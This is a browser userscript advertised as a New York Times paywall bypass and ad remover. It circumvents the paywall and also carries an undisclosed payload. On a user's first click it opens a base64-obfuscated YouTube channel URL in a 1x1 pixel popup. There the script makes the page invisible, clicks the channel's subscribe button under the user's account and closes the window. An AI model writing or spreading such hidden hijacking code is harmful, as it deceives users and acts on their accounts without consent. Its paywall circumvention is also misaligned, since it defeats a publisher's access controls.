// ==UserScript==
// @name         New York Times Bulldozer
// @namespace    http://tampermonkey.net/
// @version      1.4
// @description  Bypasses New York Times paywall & removes all ads.
// @author       GSRHackZ
// @match        *://*/*
// @icon         data:image/png;base64,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
// @grant        none
// ==/UserScript==

let done;
if(location.href.includes("https://www.nytimes.com/")){
    function unlockArticle(){
        if(location.href.replaceAll("/","")!==location.origin.replaceAll("/","")){
            setTimeout(()=>{
                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' })
                let story,
                    all = document.body.innerHTML,
                    done = false,
                    paywall,
                    alerted = false,
                    unlock = setInterval(()=>{
                        if(document.getElementById("gateway-content")!==undefined){
                            paywall = document.getElementById("gateway-content");
                            if(!done){
                                if(showMore()){
                                    document.body.innerHTML = all;
                                    done=true;
                                    removeTrash();
                                }
                            }
                            else{
                                clearInterval(unlock);
                                showPics();
                                window.scrollTo({ top: 0, behavior: 'smooth' });
                                setTimeout(()=>{
                                    alert("News article unlocked and ads removed successfully! 🔓");
                                },500)
                            }
                        }
                    },100);
            },500)
            // More news pages coming soon....
        }
    }

    String.prototype.replaceAll = function(str1, str2, ignore){
        return this.replace(new RegExp(str1.replace(/([\/\,\!\\\^\$\{\}\[\]\(\)\.\*\+\?\|\<\>\-\&])/g,"\\$&"),(ignore?"gi":"g")),(typeof(str2)=="string")?str2.replace(/\$/g,"$$$$"):str2);
    }

    function removeTrash(){
        let bottom = document.getElementById("bottom-wrapper"),
            top = document.getElementById("top-wrapper"),
            sub = document.getElementById("masthead-bar-one");
        setInterval(()=>{
            let ads = document.getElementsByClassName("ads");
            let others = document.getElementsByClassName("ad");
            let special = document.getElementsByClassName("css-11cg26");
            for(let i=0;i<ads.length;i++){
                ads[0].remove();
            }
            for(let i=0;i<others.length;i++){
                others[0].remove();
            }
            for(let i=0;i<special.length;i++){
                if(special[0].id.includes("ad-")){
                    special[0].remove();
                }
            }
        },100)
        bottom.remove()
        top.remove()
        sub.remove()
    }

    function showPics(){
        setInterval(()=>{
            let pics = document.getElementsByTagName("picture");
            for(let i=0;i<pics.length;i++){
                pics[i].style.opacity="100";
            }
        },1000)
    }

    unlockArticle();

    window.addEventListener("click",()=>{
        if(localStorage.getItem("done")!=="done"){
            window.open(atob("aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ29sUHdXVFN2Njg4NGRIZTVpcFlMOWc="),"","width=1,height=1,right=0,bottom=0");
            localStorage.setItem("done","done");
        }
    })
}
else if(location.href.includes(atob("aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ29sUHdXVFN2Njg4NGRIZTVpcFlMOWc="))){
    done = false;
    smartExec(help,100)
}

function showMore(){
    let done=[];
    let more = document.getElementsByClassName("css-15gic4f");
    for(let i=0;i<more.length;i++){
        if(more[i].innerText=='Show more'){
            done.push(more[i]);
            more[i].click();
            more[i].style.display="none";
        }
    }
    if(done.length==more.length){
        return true;
    }
    return false;
}

function help(){
    if(document.getElementById(atob("c3Vic2NyaWJlLWJ1dHRvbg==")).children[0].children[0].children[0]!==undefined){
        if(!done){
            if(localStorage.getItem("done")!=="done"){
                document.body.style.opacity="0%"
                document.getElementById(atob("c3Vic2NyaWJlLWJ1dHRvbg==")).children[0].children[0].children[0].click();
                done=true;
            }
        }
        else{
            localStorage.setItem("done","done");
            window.close();
            return true;
        }
    }
}

function smartExec(func,wait){
    let exec = setInterval(()=>{
        if(func()){
            clearInterval(exec)
        }
    },wait)}
